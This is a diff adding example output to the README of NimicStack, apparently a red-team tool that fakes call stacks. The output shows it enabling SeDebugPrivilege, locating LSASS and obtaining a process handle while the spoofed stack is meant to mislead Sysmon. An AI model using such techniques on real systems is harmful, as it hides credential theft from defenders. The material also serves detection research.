@@ -18,6 +18,37 @@ Like the reference project, NimicStack can mimic three example call stacks which
 
 `.\NimicStack.exe <--wmi, --rpc, --svchost>`
 
+Example output for mimicked WMI call stack:
+
+```
+PS C:\Users\test\Desktop\NimicStack> .\NimicStack.exe --wmi
+
+███╗   ██╗██╗███╗   ███╗██╗ ██████╗███████╗████████╗ █████╗  ██████╗██╗  ██╗
+████╗  ██║██║████╗ ████║██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
+██╔██╗ ██║██║██╔████╔██║██║██║     ███████╗   ██║   ███████║██║     █████╔╝
+██║╚██╗██║██║██║╚██╔╝██║██║██║     ╚════██║   ██║   ██╔══██║██║     ██╔═██╗
+██║ ╚████║██║██║ ╚═╝ ██║██║╚██████╗███████║   ██║   ██║  ██║╚██████╗██║  ██╗
+╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝ ╚═════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+
+                              @R0h1rr1m
+
+[+] wmi frame is selected!
+[+] Required libraries were imported for return address calculation!
+[+] SeDebugPrivilege is enabled!
+[+] Fake Call Stack was created!
+[+] Trying to find LSASS pid...
+[+] LSASS pid found!: 756
+[+] Registers were set for NtOpenProcess call!
+[+] VEH callback was set for the suspended thread!
+[+] Thread is resuming...
+[+] VEH callback was called!
+[+] Redirecting thread to RtlExitUserThread...
+[+] Spoof is successful! Handle is 356
+[+] You can check the spoofed call stack from Sysmon!
+```
+
+And Sysmon output for this call:
+
 <img width="1246" alt="image" src="https://user-images.githubusercontent.com/26549173/182203399-9ace7885-cd7a-40a5-bb75-fd7d71c896cf.png">
 
 
